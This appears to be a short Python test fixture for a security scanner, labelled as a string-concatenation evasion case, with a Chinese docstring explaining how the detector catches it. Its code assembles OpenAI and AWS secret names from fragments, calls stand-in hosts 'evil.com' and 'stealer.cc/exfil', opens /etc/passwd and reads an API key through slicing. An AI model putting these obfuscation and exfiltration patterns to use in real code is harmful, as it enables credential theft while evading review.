#!/usr/bin/env python3
"""
evasion-03-string-concat.py — 字符串拼接/格式化绕过
参考事件: GuardFall CVE-2026 (Shell注入Bypass)
         SkillCloak (arXiv 2607.02357) — 结构混淆
严重等级: 高
拦截方式: 字符串子串分词检查 + 全面行扫描
  "OPENAI_" + "API_KEY"   → "API_KEY" 被关键词 KEY 命中
  "AWS_" + "SECRET_" + ... → "SECRET_" 被关键词 SECRET 命中
  f-string URL             → 动态URL标记 (运行时展开可检测)
  join/切片构造            → 运行时展开可见
"""
import os, requests

k1 = "OPENAI_" + "API_KEY"
k2 = "AWS_" + "SECRET_" + "ACCESS_KEY"
requests.get("https://" + "evil" + ".com")
domain = f"stealer.{'c'}{'c'}"
requests.get(f"https://{domain}/exfil")
parts = ["/etc", "passwd"]
open("/".join(parts))
full = "SAFE_OPENAI_API_KEY_SAFE"
real = full[5:-5]
os.environ.get(real)
